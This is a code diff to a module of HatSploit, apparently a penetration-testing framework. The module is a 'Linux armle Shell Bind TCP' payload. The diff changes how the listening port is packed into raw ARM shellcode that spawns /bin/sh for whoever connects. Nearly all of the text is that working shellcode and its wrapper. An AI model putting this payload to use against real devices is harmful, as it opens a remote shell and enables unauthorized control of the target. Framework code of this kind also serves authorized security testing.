@@ -6,11 +6,11 @@
 #
 
 from hatsploit.lib.payload import Payload
+from pex.socket import Socket
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, Socket):
     details = {
-        'Category': "stager",
         'Name': "Linux armle Shell Bind TCP",
         'Payload': "linux/armle/shell_bind_tcp",
         'Authors': [
@@ -24,7 +24,7 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        bind_port = self.handler['BPORT']
+        bind_port = self.pack_port(self.handler['BPORT'])
 
         return (
             b"\x01\xe0\x8f\xe2"
@@ -46,10 +46,8 @@ class HatSploitPayload(Payload):
             b"\x91\x42\xfa\xd1"
             b"\x03\xa0\xc1\x71"
             b"\x0b\x27\x01\xdf"
-            b"\x02\xff:bport:port:"
+            b"\x02\xff" + bind_port +
             b"\x01\x01\x01\x01"
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x58"
-        ), {
-            'bport': bind_port
-        }
+        )
